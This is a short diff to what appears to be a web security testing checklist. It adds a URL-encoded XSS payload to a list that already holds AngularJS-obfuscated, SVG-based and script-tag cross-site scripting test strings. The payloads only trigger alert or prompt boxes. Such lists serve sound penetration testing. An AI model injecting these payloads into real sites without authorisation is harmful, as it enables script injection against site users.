@@ -48,6 +48,7 @@ Test/Check:
         - [1] | orderBy: toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41) (obfuscation with AngularJS)
         - <input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x' (obfuscation with AngularJS)
         - <svg><a><animate attributeName="href" values="javascript:alert(1)"></animate><text x="20" y="20">Click me</text></a>'</svg> (blocked tags/attributes)
+        - URL Encoded: %22%3E%3Cimg%20src=x%20onerror=prompt(1);%3E
 - DOM Based:
     - Test with Elements that support onload/onerror:
         - <script>alert(1)</script>
